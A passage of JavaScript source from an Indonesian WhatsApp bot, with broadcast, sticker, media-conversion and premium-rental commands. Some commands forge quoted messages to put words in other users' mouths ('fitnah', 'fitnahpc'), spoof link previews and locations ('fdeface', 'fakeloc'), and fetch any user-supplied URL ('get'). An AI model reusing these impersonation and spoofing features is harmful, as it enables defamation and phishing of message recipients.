					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {quoted:ftroli})
						}
						fakestatus('Suksess broadcast')
					}
					break
case 'bcvideo':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus(lang.successBc())
					}
					break
	case 'bcaudio':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus(lang.successBc())
					}
					break
case 'bcgif':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {mimetype: Mimetype.gif,quoted : ftroli,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(7)}`})
						}
						fakestatus(lang.successBc())
					}
					break
         case 'owner':
         case 'creator':  
         ini_ownerNumber = [`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`]
					let ini_list = []
					for (let i of ini_ownerNumber) {
					const vname = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
					ini_list.push({
					"displayName": 'Owner Alphabot',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${alpha.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
					hehe = await alpha.sendMessage(from, {
					"displayName": `${ini_list.length} kontak`,
					"contacts": ini_list 
					}, 'contactsArrayMessage', { quoted: fkontak})
					var ini_gopayy =`Halo @${sender.split("@")[0]} itu owner ku, jangan lupa donasi kak😇`
var buttonss = [
{buttonId: 'donasi', buttonText:{displayText: 'Donasi'}, type: 1},
{buttonId: 'sewabot', buttonText:{displayText: 'Sewa'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}\n\n© ${creator}` ,
buttons: buttonss,
headerType: 1
}
alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftoko,sendEphemeral: true 
			})
					break
                case 'sider':
                shape = '✓ '
infom = await alpha.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `> Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
			case 'fakeloc':
               var kntl = body.slice(8)
			   var nama = kntl.split("|")[0];
			   var impostor = kntl.split("|")[1];
			   var bro = fs.readFileSync(`image/${thumbnail}`)
               alpha.sendMessage(from, { name: `${nama}`,address: `${impostor}`,jpegThumbnail: bro }, MessageType.location)
                 
		    break
		    case 'on':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return 
		            offline = false
		            fakeitem(lang.ownerOn())
		            break       
		    case 'status':
		            fakeitem(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
		            break
		    case 'off':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return 
		            offline = true
		            waktu = Date.now()
		            anuu = args.join(' ') ? args.join(' ') : '-'
		            alasan = anuu
		            fakeitem(lang.ownerOff())
		            break   
		    case 'get':
		            if(!q) return reply('linknya?')
		            fetch(`${args[0]}`).then(res => res.text())  
		            .then(bu =>{
		            fakestatus(bu)
		            })   
		            break
		    case 'kontag':
		
		            pe = args.join('')
		            entah = pe.split('|')[0]
		            nah = pe.split('|')[1]
		            if (isNaN(entah)) return reply('Invalid phone number');
		            members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
		            vcard = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${nah}\n`
		            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
		            break
		    case 'sticktag':
		            if (!isGroupAdmins) return reply(lang.onlygcAdmin())
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else {
		            fakegroup(`*Reply sticker yang sudah dikirim*`)
		            }
		            break
		    case 'totag':
		            if (!isGroupAdmins) return reply(lang.onlygcAdmin())
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'audio/mp4',
		            	ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakestatus(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        break
		    case 'fitnah':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (args.length < 1) return fakegroup(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
		            var gh = args.join('')
		            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
		            var replace = gh.split("|")[0];
		            var target = gh.split("|")[1];
		            var bot = gh.split("|")[2];
		            alpha.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
		            break
		    case 'settarget':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if(!q) return fakegroup(`${prefix}settarget 628xxxxx`)
		            targetpc = args[0]
		            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
		            break
		    case 'fitnahpc':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if(!q) return fakegroup(`${prefix}fitnahpc teks target|teksny`)
		            jids = `${targetpc}@s.whatsapp.net` // nomer target
		            var splitt = args.join(' ').replace(/@|\d/gi, '').split('|')
		            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
		            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: splitt[0]}}}}
		            const responye = await alpha.sendMessage(jids, `${splitt[1]}`, MessageType.text, options)
		            await alpha.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
		            break
		    case 'tomp3':
		            if (!isQuotedVideo) return fakegroup('```Reply videonya!```')
		            fakegroup(mess.wait)
		            let encmedia2 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            let media2 = await alpha.downloadAndSaveMediaMessage(encmedia2)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
		            fs.unlinkSync(media2)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'fast':
		            if (!isQuotedVideo) return fakegroup('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia3 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media3 = await alpha.downloadAndSaveMediaMessage(encmedia3)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media3} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media3)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'slow':
		            if (!isQuotedVideo) return fakegroup('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia4 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media4 = await alpha.downloadAndSaveMediaMessage(encmedia4)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media4} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media4)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		case 'tupai':
encmedia6 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media6 = await alpha.downloadAndSaveMediaMessage(encmedia6)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media6} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media6)
if (err) return reply('Error!')
let hah = fs.readFileSync(ran)
alpha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
		    case 'reverse':
		            if (!isQuotedVideo) return fakegroup('```Reply videonya!```')
		            encmedia5 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media5 = await alpha.downloadAndSaveMediaMessage(encmedia5)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media5} -vf reverse -af areverse ${ran}`, (err) => {
		            fs.unlinkSync(media5)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'anime':
		            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
		            .then(res => res.text())
		            .then(body => {
		            let tod = body.split("\n");
		            let pjr = tod[Math.floor(Math.random() * tod.length)];
		            imageToBase64(pjr)
		            .then((response) => {
		            media =  Buffer.from(response, 'base64');
		            alpha.sendMessage(from,media,image,{quoted:mek,caption:'Dasar wibu. Nih!!!\nJgn lupa sub YT : ZEEONE OFC'})
		            }
		            )
		            .catch((error) => {
		            console.log(error); 
		            }
		            )
		            });
		            break
		    case 'kontak':
		            pe = args.join(' ') 
		            entah = pe.split('|')[0]
		            nah = pe.split('|')[1]
		            if (isNaN(entah)) return reply('Invalid phone number');
		            vcard = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${nah}\n`
		            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
		            break
case 'setexif':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                    const namaPack = q.substring(0, q.indexOf('|') - 1)
                    const authorPack = q.substring(q.lastIndexOf('|') + 2)
                    fs.unlinkSync('./sticker/data.exif')
                    sleep(2000)
                    addMetadata(namaPack, authorPack)
                    fakestatus(`Success ubah wm sticker`)
                    break    
		    case 'take':
		    case 'colong':
		    		if (!isQuotedSticker) return reply('```Reply stc nya```')
		            encmedia_ = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				    media_ = await alpha.downloadAndSaveMediaMessage(encmedia_)
		            anu = args.join(' ').split('|')
		            satu = anu[0] !== '' ? anu[0] : `SUBSCRIBE`
		            dua = typeof anu[1] !== 'undefined' ? anu[1] : `ZEEONE OFC`
		            require('./lib/fetcher.js').createExif(satu, dua)
					require('./lib/fetcher.js').modStick(media_ , alpha, mek, from)
					break
			case 'stikerwm':
			case 'stickerwm':
		    case 'swm':
		            pe = args.join('')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
		            const encmedia___ = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		             media___ = await alpha.downloadAndSaveMediaMessage(encmedia___)
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out) 
		            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
		            const encmedia___ = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const media___ = await alpha.downloadAndSaveMediaMessage(encmedia___)
		            pe = args.join('')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out)       
		            } else {
		            fakestatus(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
		            }
		            break
		    case 'upswteks':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (!q) return fakestatus('Isi teksnya!')
		            alpha.sendMessage('status@broadcast', `${q}`, extendedText)
		            fakeitem(`Sukses Up story wea teks ${q}`)
		            break
		    case 'upswimage':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (isQuotedImage) {
		            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            cihcih = await alpha.downloadMediaMessage(swsw)
		            alpha.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
		            bur = `Sukses Upload Story Image dengan Caption: ${q}`
		            alpha.sendMessage(from, bur, text, { quoted: mek })
		            } else {
		            fakegroup('```Reply gambarnya!```')
		            }
		            break
		    case 'upswvideo':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (isQuotedVideo) {
		            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            cihcih = await alpha.downloadMediaMessage(swsw)
		            alpha.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
		            bur = `Sukses Upload Story Video dengan Caption: ${q}`
		            alpha.sendMessage(from, bur, text, { quoted: mek })
		            } else {
		            fakegroup('```Reply videonya!```')
		            }
		            break
		    case 'fdeface':
		            ge = args.join('')           
		            var pe = ge.split("|")[0];
		            var pen = ge.split("|")[1];
		            var pn = ge.split("|")[2];
		            var be = ge.split("|")[3];
		            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
		            if (args.length < 1) return reply (fde)
		            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const tipes = await alpha.downloadAndSaveMediaMessage(dipes)        
		            const bufer = fs.readFileSync(tipes)
		            const desc = `${pn}`
		            const title = `${pen}`
		            const url = `${pe}`
		            const buu = `https://${be}`
		    		var anu = {
		        	detectLinks: false
		    		}
		    		var mat = await alpha.generateLinkPreview(url)
		    		mat.title = title;
		    		mat.description = desc;
		    		mat.jpegThumbnail = bufer;
		   			mat.canonicalUrl = buu; 
		    		alpha.sendMessage(from, mat, MessageType.extendedText, anu)
		            break
		    case 'public':
		              if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		          	if (banChats === false) return
		          	banChats = false
		          	//fakeitem(`「 *PUBLIC-MODE* 」`)
						sendButMessage(from, `「 *PUBLIC-MODE* 」`, `Click self to return to self mode`, [
            {
              buttonId: 'self',
              buttonText: {
                displayText: `Self Mode`,
              },
              type: 1,
            }]);
        break;
			case 'self':
			          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		          	if (banChats === true) return
		          	banChats = true
		          	//fakeitem(`「 *SELF-MODE* 」`)
		          	sendButMessage(from, `「 *SELF-MODE* 」`, `Click public to return to public mode`, [
            {
              buttonId: 'public',
              buttonText: {
                displayText: `Public Mode`,
              },
              type: 1,
            }]);
        break;
		case 'revoke':
if (!isGroup) return fakegroup(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
await alpha.revokeInvite(from)
reply(lang.success())
break
		 	case 'hidetag':
		     case '_`':
		if (!mek.key.fromMe && !isGroupAdmins && !isOwner && !isCreator) return reply(lang.onlyOwner())
		     if (!isGroup) return fakegroup(lang.onlygc())
					var value = args.join(' ')
					var group = await alpha.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map(async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var optionshidetag = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					alpha.sendMessage(from, optionshidetag, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "393470602054-1351628616@g.us" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${setting.fake}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`)} }  } })
					break
				case 'sewacheck':
				case 'ceksewa':
							if (!isGroup) return fakegroup(lang.onlygc())
							if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
							let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
							let premiumnya = `*「 SEWA EXPIRED 」*\n\n📛 *ID*: ${from}\n⏰ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
							reply(premiumnya)
							break
				case 'sewa':
							if (!isGroup)return fakegroup(lang.onlygc())
							if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
							if (args.length < 1) return reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
							if (args[0] === 'add'){
								_sewa.addSewaGroup(from, args[1], sewa)
								reply(lang.success())
								} else if (args[0] === 'del'){
									sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
									fs.writeFileSync('./src/sewa.json', JSON.stringify(sewa))
									reply(lang.success())
									} else {
										reply(`Example : *${prefix}sewa* add/del waktu`)
										}
							break
				case 'sewalist': 
				case 'listsewa':
							let txtnyee = `*「 LIST SEWA」*\nJumlah : ${sewa.length}\n\n`
							for (let i of sewa){
								let cekvipp = ms(i.expired - Date.now())
								txtnyee += `🆔 *ID :* ${i.id} \n⏰ *Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
								}
							reply(txtnyee)
							break
				case 'premium': 
							if (args.length === 0) return reply(`Kirim perintah *${prefix}premium* add/del 62xxx waktu (misal 1 hari -> 1d)\nExample:\n${prefix}premium add 62887435047326 1d`)
							if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
							if (args[0] === 'add') {
								if (mek.message.extendedTextMessage != undefined) {
									mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
									premium.addPremiumUser(mentioned[0], args[2], _premium)
									reply(`*「 PREMIUM ADDED 」*\n\n📛 *ID*: ${mentioned[0]}\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
									} else {
										premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
										reply(`*「 PREMIUM ADDED 」*\n\n📛 *ID*: ${args[1]}@s.whatsapp.net\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
										}
										} else if (args[0] === 'del') {
											if (mek.message.extendedTextMessage != undefined) {
									mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
									_premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
									fs.writeFileSync('./src/premiun.json', JSON.stringify(_premium))
									reply(lang.success())
									} else {
										_premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
										fs.writeFileSync('./src/premiun.json', JSON.stringify(_premium))
										reply(lang.success())
										}
										} else {
											reply('emror')
											}
							break
				case 'premiumcheck': case 'cekpremium': 
							if (!isPremium) return reply(`Akun kamu belum premium silahkan ${prefix}buypremium`)
							const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
							reply(`*「 PREMIUM EXPIRED 」*\n\n🆔 *ID*: ${sender}\n🏦 *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
							break
				case 'listprem': case 'listpremium':
							let txt = `「 *PREMIUM USER LIST* 」\n\n`
							let men = [];
							for (let i of _premium){
								men.push(i.id)
								const checkExp = ms(i.expired - Date.now())
								txt += `🆔 *ID :* @${i.id.split("@")[0]}\n⏰ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
								}
								mentions(txt, men, true)
							break
				case 'payment':
				let paykenekk = await getBuffer('https://telegra.ph/file/3c58eb6b1fda6c22c8668.jpg')
							sendButLocation(from, allpayment() , `Nih payment nya kak 🪀 ${enter}${enter}${botname}™© | By ${ownername}`,paykenekk,  [{"buttonId": `owner`,"buttonText": {"displayText": "OWNER"},"type": "RESPONSE"}], {})
							break
				case 'belipremium': case 'buypremium': case 'sewabot': case 'goprem':
							let sewalak = await getBuffer('https://telegra.ph/file/5e96a14f1ebaee0df2e24.jpg')
							sendButLocation(from, pc_sewa(_minggu, __minggu, ___minggu, _bulan, _permanen, __permanen) , `Jangan klik doang harus sewa beneran 😎 ${enter}${enter}${botname}™© | By ${ownername}`,sewalak,  [{"buttonId": `payment`,"buttonText": {"displayText": "PAYMENT"},"type": "RESPONSE"}], {})
							break
				case 'donasi': case 'donate':
							let donas = await getBuffer('https://telegra.ph/file/2203a91ba6216de345c3d.jpg')
